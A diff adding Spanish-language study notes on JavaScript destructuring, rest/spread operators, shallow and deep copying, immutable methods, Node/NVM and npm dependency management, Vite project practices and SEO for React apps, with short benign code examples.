@@ -3156,3 +3156,6002 @@ API_URL: No accesible en código (permanece solo a nivel del servidor de build).
 .env.production	Sobrescribe valores solo para el entorno de producción (NODE_ENV=production).
 ##### .env.local	Configuración personal que nunca debe ser subida a Git (útil para credenciales locales o configuraciones específicas de la máquina).
 
+
+### Vite env
+
+
+
+
+## Desestructuración
+
+Desempaquetar valores de arrays y objetos para asignarlos a variables de forma concisa y legible
+
+
+### Arrays
+
+La sintaxis utiliza corchetes en el lado izquierdo de la asignación para definir qué variables recibirán los valores del arreglo en el lado derecho
+
+##### La asignación se realiza por posición (índice), no por nombre.
+
+```
+const colores = ["Rojo", "Verde", "Azul"];
+
+// 1. Desestructuración básica por posición:
+const [primerColor, segundoColor, tercerColor] = colores;
+
+console.log(primerColor);   // "Rojo"
+console.log(segundoColor);  // "Verde"
+console.log(tercerColor);   // "Azul"
+```
+
+1. Asignación con Valores por Defecto
+
+##### Asignar valores por defecto a las variables en caso de que el valor en esa posición del arreglo sea undefined o no exista.
+
+```
+const frutas = ["Manzana", "Naranja"];
+
+// 'Uva' se usa como valor por defecto si no existe un tercer elemento
+const [f1, f2, f3 = "Uva"] = frutas;
+
+console.log(f3); // "Uva"
+```
+
+
+2. Ignorar Valores
+
+Si solo necesitas algunos valores del arreglo y quieres omitir otros, puedes usar comas para saltar las posiciones.
+
+```
+const datos = [10, 20, 30, 40];
+
+// Ignora 20 y 40
+const [a, , c] = datos;
+
+console.log(a); // 10
+console.log(c); // 30
+```
+
+
+3. Operador Rest (...)
+
+Recolectar todos los elementos restantes del arreglo en una nueva variable de tipo arreglo
+
+Este operador siempre debe ser el último en la lista de desestructuración.
+
+```
+const lista = ["a", "b", "c", "d", "e"];
+
+const [primero, segundo, ...resto] = lista;
+
+console.log(primero); // "a"
+console.log(resto);   // ["c", "d", "e"]
+```
+
+
+4. Intercambio de Variables
+
+##### La desestructuración simplifica enormemente el proceso de intercambiar valores entre dos variables sin necesidad de una variable temporal. 
+
+```
+let x = 5;
+let y = 10;
+
+[x, y] = [y, x]; // ¡Intercambio en una sola línea!
+
+console.log(x); // 10
+console.log(y); // 5
+```
+
+
+5. Desestructuración en Retornos de Funciones
+
+##### Es muy común que las funciones devuelvan un arreglo (por ejemplo, [valor, setter] en useState de React).
+
+La desestructuración hace que el manejo de estos retornos sea muy limpio.
+
+```
+function usarConfig() {
+  return [42, () => console.log("Configuración aplicada")];
+}
+
+// Desestructura directamente el valor de retorno:
+const [id, aplicar] = usarConfig();
+
+console.log(id); // 42
+aplicar(); // "Configuración aplicada"
+```
+
+
+### Objetos
+
+##### Permite desempaquetar propiedades de objetos en variables separadas con el mismo nombre que la propiedad, de forma concisa y legible.
+
+##### Se asigna por nombre de propiedad, no por posición.
+
+Utiliza llaves {} en el lado izquierdo de la asignación para listar las propiedades que quieres extraer del objeto en el lado derecho
+
+```
+const usuario = {
+  nombre: "Alice",
+  edad: 30,
+  ciudad: "Madrid"
+};
+
+// 1. Desestructuración básica por nombre de propiedad:
+const { nombre, edad } = usuario;
+
+console.log(nombre); // "Alice"
+console.log(edad);   // 30
+// console.log(ciudad); // undefined (No fue desestructurada)
+```
+
+
+1. Renombrar Variables (Alias)
+
+##### A veces, la variable que quieres crear debe tener un nombre diferente al de la propiedad del objeto
+
+##### Puedes renombrar la variable usando dos puntos : durante la desestructuración.
+
+```
+const producto = { nombre: "Laptop", precio: 1200 };
+
+// Extrae 'nombre' y asígnalo a una variable llamada 'nombreProducto'
+const { nombre: nombreProducto, precio } = producto; 
+
+console.log(nombreProducto); // "Laptop"
+// console.log(nombre); // Error: nombre no está definido
+```
+
+
+2. Asignación con Valores por Defecto
+
+Asignar valores por defecto en caso de que la propiedad no exista en el objeto (sea undefined).
+
+```
+const configuracion = { theme: "dark" };
+
+// 'lenguaje' se usará si la propiedad no existe
+const { theme, lenguaje = "es" } = configuracion;
+
+console.log(theme);     // "dark"
+console.log(lenguaje);  // "es"
+```
+
+
+3. El Operador Rest (...)
+
+Se usa para recolectar todas las propiedades restantes del objeto en un nuevo objeto.
+
+```
+const datosUsuario = { id: 1, nombre: "Bob", edad: 40, email: "bob@mail.com" };
+
+// Extrae 'nombre' y recoge el resto de propiedades en un nuevo objeto llamado 'restoDatos'
+const { nombre, ...restoDatos } = datosUsuario; 
+
+console.log(nombre);    // "Bob"
+console.log(restoDatos); // { id: 1, edad: 40, email: "bob@mail.com" }
+```
+
+
+4. Desestructuración Anidada
+
+##### Desestructurar propiedades de objetos que están anidados dentro del objeto principal.
+
+```
+const empresa = {
+  nombre: "TechCorp",
+  direccion: {
+    ciudad: "NY",
+    zip: "10001"
+  }
+};
+
+// Extrae 'ciudad' del objeto anidado 'direccion'
+const { direccion: { ciudad } } = empresa; 
+
+console.log(ciudad); // "NY"
+// console.log(direccion); // Error: el objeto 'direccion' no fue desestructurado, solo se usó para el path
+```
+
+
+5. Desestructuración en Argumentos de Funciones
+
+Uno de los usos más comunes en React y en la programación funcional
+
+Puedes desestructurar un objeto de props directamente en la definición de la función del componente.
+
+```
+// En React, el objeto 'props' se desestructura directamente:
+function ComponenteUsuario({ nombre, email }) {
+  // Ahora usas 'nombre' y 'email' directamente, sin usar props.nombre
+  return <h1>Usuario: {nombre}, Email: {email}</h1>; 
+}
+```
+
+
+## Rest y Spread Operator
+
+### Rest
+
+##### Permite recolectar elementos o propiedades restantes de una estructura (como un arreglo o un objeto) y agruparlos en una única nueva variable.
+
+"Rest" proviene de que recolecta el resto de los elementos no asignados.
+
+
+1. En desestructuración de arrays
+
+##### Recolecta todos los elementos restantes del arreglo que no han sido desestructurados y los coloca en un nuevo arreglo
+
+```
+const numeros = [1, 2, 3, 4, 5];
+
+// 'primero' toma el 1, 'segundo' toma el 2.
+// 'resto' recolecta el 3, 4 y 5 en un nuevo arreglo.
+const [primero, segundo, ...resto] = numeros; 
+
+console.log(primero); // 1
+console.log(resto);   // [3, 4, 5]
+```
+
+##### El operador Rest ... siempre debe ser el último elemento en la desestructuración de arreglos, ya que recolecta todo lo demás.
+
+
+2. En la desestructuración de Objetos
+
+Recolecta todas las propiedades restantes de un objeto que no han sido desestructuradas y las agrupa en un nuevo objeto.
+
+```
+const usuario = { nombre: "Alice", edad: 30, ciudad: "NY", pais: "USA" };
+
+// 'nombre' toma "Alice", el resto de propiedades se agrupan en 'otrosDatos'.
+const { nombre, ...otrosDatos } = usuario; 
+
+console.log(nombre);     // "Alice"
+console.log(otrosDatos); // { edad: 30, ciudad: "NY", pais: "USA" }
+```
+
+
+3. En definición de funciones (Rest Params)
+
+##### Permite que una función acepte un número indefinido de argumentos como un arreglo.
+
+Útil cuando no sabes cuántos argumentos recibirá tu función
+
+```
+function sumarTodos(a, b, ...losDemas) {
+  let suma = a + b;
+  // 'losDemas' es un arreglo, por lo que podemos usar métodos de arreglo como 'forEach' o 'reduce'.
+  losDemas.forEach(num => {
+    suma += num;
+  });
+  return suma;
+}
+
+// 10 y 20 son 'a' y 'b'. El resto (30, 40, 50) es 'losDemas'.
+console.log(sumarTodos(10, 20, 30, 40, 50)); // Resultado: 150
+```
+
+##### El operador Rest ... debe ser el último parámetro listado en la definición de la función.
+
+
+### Rest vs Spread 
+
+Utilizan la misma sintaxis (...)
+
+Rest:
+Recolectar/Empaquetar (Agrupa múltiples elementos en un solo arreglo/objeto).
+Ubicación: En el lado izquierdo de la asignación (desestructuración) o como el último parámetro de una función.
+
+Spread:
+Expandir/Desempaquetar (Descompone un arreglo/objeto en elementos individuales).
+Ubicación: En el lado derecho de la asignación (cuando se define un nuevo arreglo u objeto) o como argumento al llamar a una función
+
+```
+const arr1 = [1, 2];
+const arr2 = [3, 4];
+
+// Spread: Expande los elementos de arr1 y arr2 en un nuevo arreglo.
+const nuevoArreglo = [...arr1, ...arr2]; // [1, 2, 3, 4]
+```
+
+
+
+### Spread
+
+##### Expandir un elemento iterable (como un arreglo o una string) en sus componentes individuales.
+
+##### Desempaqueta elementos en lugares donde se esperan elementos individuales
+
+1. Copiar y Clonar Arreglos u Objetos
+
+##### Forma más moderna y común de crear una copia superficial de un arreglo o un objeto, garantizando la inmutabilidad.
+
+Array: Desempaqueta el arreglo en una nueva lista de elementos.
+
+```
+const original = [1, 2, 3];
+const copia = [...original]; // Crea [1, 2, 3]
+
+console.log(copia === original); // false (Son referencias de memoria diferentes)
+```
+
+
+Objetos: Desempaqueta las propiedades del objeto en un nuevo objeto
+
+Es vital en React para actualizar el estado de manera inmutable.
+
+```
+const usuario = { nombre: "Leo", edad: 25 };
+const nuevoUsuario = { ...usuario, edad: 26 }; // Copia y sobrescribe 'edad'
+
+console.log(nuevoUsuario); // { nombre: "Leo", edad: 26 }
+console.log(usuario);     // { nombre: "Leo", edad: 25 } (Original no mutado)
+```
+
+
+2. Combinar Arreglos u Objetos
+
+##### Simplifica la concatenación de arreglos o la fusión de objetos sin usar métodos mutables como push o concat.
+
+Combinar arrays
+
+```
+const a = [1, 2];
+const b = [3, 4];
+const combinado = [...a, ...b, 5];
+
+console.log(combinado); // [1, 2, 3, 4, 5]
+```
+
+Combinar Objetos:
+
+```
+const configDefecto = { theme: 'light', idioma: 'es' };
+const configUsuario = { idioma: 'en', notificaciones: true };
+// El objeto a la derecha sobrescribe propiedades con el mismo nombre.
+const final = { ...configDefecto, ...configUsuario }; 
+
+console.log(final); 
+// { theme: 'light', idioma: 'en', notificaciones: true }
+```
+
+
+3. Pasar Argumentos a Funciones
+
+##### Spread permite pasar los elementos de un arreglo como argumentos individuales a una función
+
+##### Útil para funciones que esperan múltiples parámetros fijos.
+
+```
+function sumar(a, b, c) {
+  return a + b + c;
+}
+
+const numeros = [10, 20, 30];
+
+// Expande [10, 20, 30] en tres argumentos separados: sumar(10, 20, 30)
+console.log(sumar(...numeros)); // 60
+```
+
+
+4. Convertir Iterables a Arreglos
+
+##### Convertir cualquier objeto iterable (como una string o un NodeList del DOM) en un arreglo.
+
+```
+const nombre = "React";
+
+// Expande "R", "e", "a", "c", "t" en un nuevo arreglo.
+const letras = [...nombre]; 
+
+console.log(letras); // ["R", "e", "a", "c", "t"]
+```
+
+
+Vs Rest
+
+Spread (...): Expande/Desempaqueta elementos de una fuente. 
+(Se usa en el lado derecho de una asignación o al llamar una función).
+
+Rest (...): Recolecta/Empaqueta elementos restantes en un arreglo u objeto. 
+(Se usa en el lado izquierdo de una asignación o en la definición de parámetros de una función).
+
+
+
+### Copia Superficial vs Copia Profunda: inmutabilidad
+
+#### Superficial en arrays y objetos
+
+Duplica una estructura de datos (arreglo u objeto) que contiene otras estructuras anidadas.
+
+crea un nuevo arreglo u objeto de nivel superior
+
+##### Pero los elementos o propiedades anidadas (objetos o arreglos internos) siguen referenciando los mismos objetos que la fuente original
+
+Ej: array de dos niveles
+
+```
+const original = [1, { id: 100, valor: 'A' }, 3];
+//                     ^ Propiedad Anidada (Objeto)
+```
+
+
+Cuando creas una copia superficial de original:
+
+1. Se crea un nuevo arreglo llamado copia.
+
+2. El elemento 1 y el 3 (que son primitivos) se copian por valor.
+
+3. El objeto { id: 100, valor: 'A' } (la propiedad anidada) no se duplica. En su lugar, el nuevo arreglo copia almacena una referencia (un puntero) al mismo objeto anidado que está en el arreglo original.
+
+##### Efecto: Si modificas el objeto anidado en la copia, también lo modificas en el original, porque ambos apuntan al mismo lugar en la memoria    
+
+
+Métodos para hacer copias superficiales
+
+1. arrays: Spread Operator (...)
+Es el método más moderno
+Desempaqueta todos los elementos del arreglo original en un nuevo arreglo
+
+```
+const copia = [...original];
+```
+
+2. Array.prototype.slice():
+Devuelve una porción del arreglo
+Usado sin argumentos, devuelve una copia superficial de todo el arreglo.
+
+```
+const copia = original.slice();
+```
+
+3. Array.from():
+Crea una instancia de Array a partir de un iterable.
+
+```
+const copia = Array.from(original);
+```
+
+
+Objetos: 
+
+1. Spread Operator (...)
+Forma preferida
+Desempaqueta todas las propiedades enumerables del objeto original en un nuevo objeto.
+
+```
+const copia = { ...original };
+```
+
+2. Object.assign()
+Fusiona las propiedades de uno o más objetos fuente en un objeto destino
+Usando un objeto vacío ({}) como destino, se crea la copia.
+
+```
+const copia = Object.assign({}, original);
+```
+
+
+Ej: Riesgo de Mutación
+
+##### La copia superficial no es segura para datos anidados y por qué es crucial en React.
+
+```
+const productos = [
+  { id: 1, nombre: 'Laptop' },
+  { id: 2, nombre: 'Monitor' } // <--- Objeto Anidado
+];
+
+// 1. Crear una Copia Superficial (Método recomendado)
+const copiaProductos = [...productos]; 
+
+// Verificar que los arreglos son diferentes:
+console.log(productos === copiaProductos); // false (OK, son arreglos diferentes)
+
+// 2. Modificar el Objeto Anidado en la Copia:
+copiaProductos[1].nombre = 'Monitor 4K'; // ¡Mutación del objeto anidado!
+
+// 3. Resultado: ¡El original también fue modificado!
+console.log(productos[1].nombre); // "Monitor 4K" 
+// Esto sucede porque copiaProductos[1] y productos[1] apuntan a la misma dirección de memoria.
+```
+
+##### La copia superficial solo garantiza la inmutabilidad del nivel superior
+
+##### Si necesitas modificar una propiedad anidada sin afectar al original, debes realizar una Copia Profunda (Deep Copy) de esa parte del objeto o de toda la estructura.
+
+
+
+#### Profunda en arrays y objetos
+
+##### Duplicar un arreglo o un objeto de modo que todos los niveles de la estructura de datos (incluidos los objetos y arreglos anidados) sean nuevos y apunten a diferentes ubicaciones de memoria.
+
+Esto es la única manera de garantizar la inmutabilidad total, ya que modificar el objeto anidado en la copia no afectará al objeto original.
+
+1. Crea un nuevo contenedor (arreglo u objeto).
+
+2. Itera a través de cada propiedad o elemento.
+
+3. Si la propiedad es un valor primitivo (string, number, boolean, null, undefined), lo copia por valor.
+
+4. Si la propiedad es un objeto o arreglo anidado, aplica el proceso de copia profunda recursivamente a ese objeto anidado.
+
+El resultado es una estructura completamente nueva e independiente de la fuente.
+
+
+JavaScript moderno no tiene un método nativo y universalmente seguro para la copia profunda (a diferencia de la copia superficial)
+
+Debes usar técnicas o librerías específicas.
+
+
+1. JSON.parse(JSON.stringify())
+
+Método más común y rápido, pero tiene limitaciones importantes
+
+```
+const original = { id: 1, fecha: new Date(), datos: [1, 2] };
+
+// 1. Convertir a String (serialización)
+// 2. Volver a convertir a Objeto (deserialización)
+const copiaProfunda = JSON.parse(JSON.stringify(original));
+```
+
+Limitaciones:
+
+##### Funciones: Las funciones dentro del objeto se pierden.
+
+Fechas: Los objetos Date se convierten en strings y pierden su tipo original.
+
+RegExp: Las expresiones regulares se convierten en objetos vacíos.
+
+undefined: Las propiedades con valor undefined se pierden.
+
+Objetos Complejos: Objetos con referencias circulares (donde A apunta a B y B apunta a A) causarán un error.
+
+
+2. Uso de structuredClone() (Moderno y Seguro)
+
+Es una API global introducida en JavaScript (soporte moderno en navegadores y Node.js 16+).
+
+Está diseñado específicamente para crear copias profundas de manera segura y eficiente.
+
+```
+const original = { id: 1, fecha: new Date(), datos: [1, 2] };
+
+// Copia profunda segura de objetos complejos y tipos de datos modernos.
+const copiaProfunda = structuredClone(original);
+```
+
+##### Maneja Mapas, Sets, Date, RegExp y ArrayBuffer correctamente.
+
+Maneja referencias circulares sin fallar.
+
+Es la mejor opción nativa para el 99% de los casos de uso
+
+
+3. Librerías (Máxima Compatibilidad)
+
+##### Para entornos legacy o cuando se requiere una funcionalidad de copia profunda muy sofisticada, las librerías especializadas siguen siendo la mejor opción
+
+Lodash: Usa la función `_.cloneDeep(value)`.
+
+Es robusta, maneja la mayoría de los casos de borde y es compatible con entornos más antiguos
+
+
+En React
+
+La copia profunda es crucial:
+
+1. Estado Anidado: Necesitas actualizar una propiedad dentro de un objeto anidado en tu estado (ej., un campo de un formulario anidado).
+
+2. useReducer Complejo: El estado manejado por un reducer es una estructura de datos profunda.
+
+##### Intentar modificar una propiedad anidada después de una copia superficial causará un error lógico
+
+##### React no detectará que el objeto anidado ha cambiado, y el componente no se volverá a renderizar con el valor correcto.
+
+
+
+## Métodos, props y funciones inmutables
+
+
+### Para Arrays
+
+1. Creación y Transformación
+
+Devuelven un nuevo arreglo que contiene los resultados de la operación, dejando el arreglo fuente intacto.
+
+map():
+Crea un nuevo arreglo aplicando una función (callback) a cada elemento del arreglo original
+El nuevo arreglo siempre tiene la misma longitud.
+Transformar o modificar cada elemento individualmente.
+
+filter():
+Crea un nuevo arreglo con todos los elementos que cumplen la condición de la función (callback),
+que devuelven true.
+Seleccionar un subconjunto de elementos.
+
+slice():
+Devuelve una copia superficial de una porción del arreglo original en un nuevo arreglo
+Si se usa sin argumentos (arr.slice()), crea una copia completa.
+Clonar un arreglo o extraer un rango
+
+concat():
+Devuelve un nuevo arreglo que contiene los elementos del arreglo original más los elementos o arreglos que se le pasen como argumentos.
+Combinar dos o más arreglos.
+
+spread operator (...):
+El operador Spread expande el arreglo original en sus elementos individuales
+que luego pueden ser usados para construir un nuevo arreglo de forma inmutable.
+Clonar, combinar o añadir elementos a un arreglo.
+
+
+2. Métodos de Búsqueda y Reducción (Devuelven un Valor Único)
+
+Procesan el arreglo para devolver un valor único o un subconjunto, sin modificar la fuente.
+
+find(): 
+Devuelve el primer elemento del arreglo que cumple con la condición de la función callback.
+Devuelve undefined si no encuentra ninguno.
+Encontrar un elemento específico.
+
+findIndex():
+Devuelve el índice del primer elemento que cumple con la condición
+Devuelve -1 si no lo encuentra.
+Encontrar la posición de un elemento.
+
+reduce():
+Ejecuta una función sobre todos los elementos del arreglo (de izquierda a derecha) para devolver un único valor acumulado.
+Calcular una suma, un promedio, o transformar el arreglo a un objeto
+
+includes():
+Devuelve un booleano (true o false) indicando si el arreglo contiene un valor específico.
+Verificar la existencia de un valor.
+
+indexOf():
+Devuelve el primer índice en el que se puede encontrar un elemento dado.
+Devuelve -1 si no está presente.
+Obtener la posición de un valor conocido.
+
+every():
+Devuelve un booleano (true) si todos los elementos en el arreglo cumplen con la condición de la función callback.
+Validar si una condición se cumple universalmente.
+
+some():
+Devuelve un booleano (true) si al menos un elemento en el arreglo cumple con la condición de la función callback.
+Verificar la existencia de al menos un elemento que cumpla una condición.
+
+
+3. Propiedad de Acceso
+
+length	
+Devuelve la cantidad de elementos en el arreglo. 
+No modifica el contenido
+Conocer el tamaño del arreglo o iterar sobre él.
+
+
+### Para Objetos
+
+1. Métodos de Creación y Clonación (Devuelven un Nuevo Objeto)
+
+Forma estándar de obtener una copia del objeto original y aplicar cambios en esa copia.
+
+Object.assign():
+Crea un nuevo objeto fusionando las propiedades de uno o más objetos fuente en un objeto destino
+Para la inmutabilidad, el primer argumento debe ser un objeto vacío ({}).
+Clonar un objeto o fusionar varios objetos en uno solo
+
+spread operator (...):
+expande las propiedades del objeto original en un nuevo objeto, permitiendo añadir o sobrescribir propiedades de forma concisa.
+La forma más común y legible de clonar y actualizar el estado de un objeto en React.
+
+
+2. Métodos de Acceso, Iteración y Conversión (Devuelven un Valor Diferente)
+
+Solo leen la información del objeto o la transforman en otro tipo de estructura de datos (como un arreglo), sin alterar el objeto fuente.
+
+Object.keys():
+Devuelve un nuevo arreglo que contiene los nombres de las propiedades (claves) enumerables de un objeto.
+Iterar sobre las claves del objeto.
+
+Object.values():
+Devuelve un nuevo arreglo que contiene los valores de las propiedades enumerables de un objeto.
+Obtener todos los valores para procesarlos (ej., calcular una suma).
+
+Object.entries():
+Devuelve un nuevo arreglo de arreglos
+donde cada arreglo interno contiene el par clave, valor 
+de las propiedades enumerables del objeto.
+Iterar sobre las propiedades y valores simultáneamente.
+
+hasOwnProperty():
+Devuelve un booleano (true o false)
+indicando si el objeto posee la propiedad especificada directamente
+(sin contar la cadena de prototipos).
+Verificar la existencia segura de una propiedad
+
+JSON.parse(JSON.stringify(obj)):
+Función de utilidad: Convierte el objeto a una cadena JSON
+y luego lo vuelve a convertir a un objeto
+Crea una copia profunda (funciona solo con datos serializables).
+Clonación profunda de objetos simples
+(sin funciones o fechas).
+
+
+3. Propiedad de Acceso
+
+(Notación de corchetes):
+Accede al valor de una propiedad del objeto. 
+No lo modifica.
+Obtener el valor de una propiedad dinámica o que contiene espacios.
+
+(Notación de punto)
+Accede al valor de una propiedad del objeto
+No lo modifica.
+Obtener el valor de una propiedad conocida estáticamente
+
+En JS nativo, la única forma directa de mutar un objeto es mediante la asignación directa (obj.propiedad = nuevoValor) o usando el método delete para eliminar una propiedad
+Estos métodos ayudan a evitar esas mutaciones
+
+
+
+# Proyecto
+
+Entornos, dependencias, paquetes, etc 
+
+Gestión de las versiones de Node.js, npm y las dependencias locales
+
+
+## Node y NVM
+
+Entorno de ejecución de JavaScript en el servidor (o máquina). Actualizarlo tiene el mayor impacto a nivel de sistema.
+
+Un Gestor de Versiones de Node (NVM) permite tener múltiples versiones de Node instaladas y cambiar entre ellas por proyecto o sesión.
+
+1. Instalar NVM
+
+2. Instalar última versión LTS: nvm install --lts
+
+3. Usar la versión: `nvm use [versión]` (ej: nvm use 20.10.0)
+
+
+Comandos de NVM:
+
+`nvm install 20`	Instala la última versión principal 20.
+`nvm use 20.10.0`	Cambia a la versión 20.10.0 en la sesión actual.
+`nvm ls`	Lista todas las versiones de Node instaladas.
+`nvm alias default 20`	Establece la versión 20 como la predeterminada al iniciar la terminal.
+`nvm install --lts`	Instala la versión de Soporte a Largo Plazo (LTS) más reciente.
+`nvm use default`	Vuelve a la versión predeterminada.
+
+
+Ventajas: 
+
+Características Modernas:
+Acceso a las últimas características de JavaScript (ESNext) sin necesidad de Babel, ya que el motor V8 de Node está actualizado
+
+Seguridad:
+Las versiones LTS (Long-Term Support) más recientes incluyen parches críticos para vulnerabilidades de seguridad.
+Es el principal motivo para actualizar.
+
+Compatibilidad de Módulos:
+Algunos módulos binarios (N-API) o herramientas globales pueden requerir una versión específica de Node para compilarse o funcionar correctamente
+
+##### La versión que configures afectará a todos los proyectos que no usen un .nvmrc o gestor local.
+
+
+
+## Paquetes (Dependencias Locales)
+
+Los paquetes locales son las librerías específicas de tu proyecto, listadas en package.json (ej: React, Express, Webpack).
+
+1. Auditoría de Vulnerabilidades
+`npm audit` (Identifica vulnerabilidades de seguridad conocidas).
+
+2. Usar herramientas como `npm-check-updates` (ncu) o el modo interactivo de npm para ver qué versión mayor o menor está disponible. 
+
+3. Actualizar Paquetes Específicos:
+`npm install [paquete]@[versión]` (Para una actualización controlada).
+
+4. Actualizar Todos (con riesgo):
+`npm update` (Solo actualiza a la versión menor o parche dentro del rango especificado en package.json).
+
+
+Implicaciones: 
+
+Rendimiento y Funcionalidad:
+Acceso a optimizaciones, nuevas características y correcciones de bugs de las librerías que utilizas
+(ej. mejor rendimiento de React, nuevas funciones de Express).
+
+Ruptura (Breaking Changes):
+Mayor riesgo
+##### Las actualizaciones de versión mayor (ej: v1.x a v2.x) pueden incluir cambios que rompen la compatibilidad y requieren refactorizar tu código.
+
+Seguridad Local:
+Soluciona vulnerabilidades conocidas en paquetes de terceros que podrían ser explotadas en tu aplicación o durante el proceso de build.
+
+Tamaño de Bundle:
+Algunas librerías reducen su tamaño en versiones más nuevas, lo que puede resultar en un bundle de producción más ligero.
+
+
+SemVer y Riesgo:
+
+Cuando actualizas dependencias locales, el Versionado Semántico (SemVer) guía el riesgo:
+
+1. Parche (.0.0): Correcciones de bugs. Riesgo muy bajo. (Ej: 1.0.4 a 1.0.5)
+
+2. Menor (0.0): Nuevas características compatibles con versiones anteriores. Riesgo bajo a medio. (Ej: 1.4.0 a 1.5.0)
+
+3. Mayor (0.0.0): Incompatibilidad
+Contiene breaking changes
+Riesgo alto. 
+(Ej: 1.5.0 a 2.0.0)
+
+##### Siempre revisa el changelog de las librerías cuando actualices una versión mayor.
+
+
+
+## Vite
+
+### TS config
+
+1. tsconfig.json tenga reglas estrictas (strict: true) para capturar errores temprano.
+
+
+2. Instalar dependencias de desarrollo
+
+
+3. Variables de entoro: 
+
+Usa .env con el Prefijo VITE_:
+
+Vite solo expone las variables de entorno al código fuente si comienzan con VITE_ (ej., VITE_API_URL).
+
+
+4. Separación: Usa .env.development para tu API local
+
+.env.production para la URL de la API desplegada
+
+Facilita cambiar de entorno rápidamente.
+
+
+5. Memorización de Referencias:
+
+Estabilidad de Props: Utiliza useCallback para estabilizar las funciones que pasas como props
+useMemo para estabilizar objetos o arreglos que pasas a componentes memoizados.
+
+Dependencias Limpias: Asegúrate de que los arreglos de dependencias (useEffect, useMemo, useCallback) sean correctos para que la lógica se ejecute solo cuando sea necesario, y no en cada renderizado
+
+
+6. Carga Diferida (Lazy Loading):
+
+Rutas Dinámicas: Usa la combinación de React.lazy()
+
+Suspense en tus archivos de rutas (/pages).    
+
+Esto divide el código (code splitting) por página, reduciendo el tamaño del bundle inicial y mejorando la velocidad de carga percibida.
+
+
+7. Fragmentos Cortos
+
+Evita div Innecesarios: Prioriza el uso de la sintaxis corta de Fragmentos (<>...</>) en lugar de <div> cuando solo necesitas agrupar elementos sin añadir un nodo extra al DOM
+
+Esto mantiene el árbol DOM más ligero y mejora ligeramente el rendimiento.
+
+
+8. Importaciones Absolutas
+
+Simplifica las Rutas:
+
+Configura alias de rutas en el archivo vite.config.js
+
+tsconfig.json para evitar la navegación con rutas relativas largas
+
+(ej., ../../../components/ui).
+
+Ej: Configura @/ para que apunte a /src.
+
+Luego puedes importar usando import Boton from '@/components/ui/Boton'.
+
+
+9. Estado Global y Contexto
+
+##### Modulariza el Estado Global
+
+Si usas una librería como Redux (o el Context API)
+
+divide tu store o context en módulos pequeños (slices/features).
+
+garantiza que las actualizaciones de una parte del estado (ej., el tema)
+
+no fuerzen re-renderizados innecesarios en componentes que solo usan otra parte (ej., la autenticación).
+
+
+10. Custom Hooks para el Contexto:
+
+##### Siempre crea un Custom Hook (ej., useAuth) para consumir un Context
+
+Esto no solo limpia el código en el componente, sino que te permite añadir lógica de validación
+
+(por ejemplo, verificar si el hook se llama fuera de su Provider)
+
+garantiza que las funciones devueltas sean estables con useCallback.
+
+
+11. Separación Rigurosa
+
+##### Asegúrate de que solo los Componentes Contenedor (los que están en /features) se conecten a la API o al store global
+
+Los Componentes Presentacionales (en /components/ui) solo deben recibir datos a través de props.
+
+
+12. Despliegue y CI/CD
+
+Previsualización Local del Build:
+
+Verifica la Producción: Antes de hacer deploy, siempre ejecuta una versión compilada y optimizada de tu aplicación localmente
+
+##### Para verificar que el code splitting y las variables de entorno de producción funcionen correctamente.
+
+```
+npm run build # Genera la carpeta /dist
+npm install -g serve # Instala un servidor simple
+serve -s dist       # Sirve la carpeta /dist
+```
+
+Automatización y CI/CD:
+
+Gatilla el Build en el main: Configura tu pipeline de CI/CD (GitHub Actions, GitLab CI, etc.) para que automáticamente ejecute los tests y el build (npm run build) cada vez que se fusione código a la rama principal (main).
+
+Esto asegura que el despliegue siempre provenga de un artefacto probado
+
+
+Estrategia de Caching:
+
+Cache-Busting: Vite maneja automáticamente el cache-busting al añadir hashes a los nombres de los archivos (app.a1b2c3d4.js).
+
+Esto asegura que los usuarios siempre descarguen las últimas versiones de los archivos JS/CSS después de un nuevo despliegue.
+
+
+13. Accesibilidad (A11y) y SEO
+
+Etiquetas Semánticas:
+
+Prioriza HTML Nativo: Utiliza elementos HTML semánticos (<header>, <nav>, <main>, <footer>) en lugar de depender únicamente de <div> con clases. 
+
+Esto ayuda a los screen readers y mejora el SEO.
+
+
+Etiquetas Alt en Imágenes:
+
+Nunca Olvides el alt: Asegúrate de que todos los componentes de imagen tengan una prop alt con una descripción significativa para cumplir con los estándares de accesibilidad.
+
+
+Gestión de Metadatos:
+
+Control del document.title: Utiliza librerías como react-helmet-async para gestionar dinámicamente el título de la página (document.title) y otras etiquetas meta dentro del componente de cada página
+
+Esto es crucial para el SEO.
+
+
+## SEO
+
+Mientras que el contenido y los backlinks son clave, la forma en que React construye y sirve la aplicación es fundamental para que los crawlers (rastreadores) de Google puedan indexarla correctamente
+
+
+React y SPAs:
+
+El mayor desafío del SEO en React es que, por defecto, se construye como una SPA
+
+Donde el HTML inicial está casi vacío y el contenido se carga dinámicamente con JavaScript
+
+Los crawlers antiguos podían tener problemas al indexar este contenido.
+
+
+1. Servir Contenido Renderizado Previamente
+
+Asegura que el crawler vea el contenido final de la página inmediatamente.
+
+
+SSR (Server-Side Rendering): El servidor (Node.js) renderiza la página completa a HTML en cada solicitud:
+
+Es la mejor opción para contenido que cambia frecuentemente y que debe tener la información más actual
+
+Next.js y Remix son frameworks que hacen esto por defecto.
+
+
+SSG (Static Site Generation): El HTML se genera por adelantado en el momento del build (ej., páginas de landing o documentación).
+
+Es extremadamente rápido para el SEO
+
+Gatsby y Next.js también lo soportan
+
+
+Prerendering: Se usa un servicio para pre-renderizar las rutas clave en HTML estático que se sirve a los crawlers.
+
+
+2. Gestión de Metadatos Dinámicos
+
+Los metatags (<title>, <meta name="description">) son vitales para el SEO y deben ser específicos para cada ruta.
+
+Librerías de Helmet: Utiliza librerías como react-helmet-async (o componentes de Next.js como <Head>) 
+
+para inyectar dinámicamente las etiquetas <title>, <meta name="description">, y etiquetas Open Graph (og:title, etc.) en el <head> del documento
+
+basadas en la ruta actual o en los datos de la página.
+
+Buena Práctica: Cada componente de página debe definir sus propios metatags.
+
+
+3. URL Limpias y Semánticas
+
+Routing Basado en el Historial: Asegúrate de que tu enrutamiento (routing) utilice el API de Historial de HTML5
+
+(por defecto en react-router-dom
+
+para crear URLs legibles y semánticas
+
+(ej., /productos/laptop-gamer)
+
+en lugar de URLs con hash (ej., /#/productos/laptop-gamer).
+
+
+URLs Descriptivas: La estructura de la URL debe reflejar la jerarquía del sitio.
+
+
+Contenido y Experiencia de Usuario (UX):
+
+Imágenes Optimizadas y Accesibles
+Compresión y Formatos Modernos: Usa formatos de imagen modernos (WebP o AVIF) y comprime las imágenes para reducir el tamaño de descarga. Vite facilita el procesamiento de imágenes.
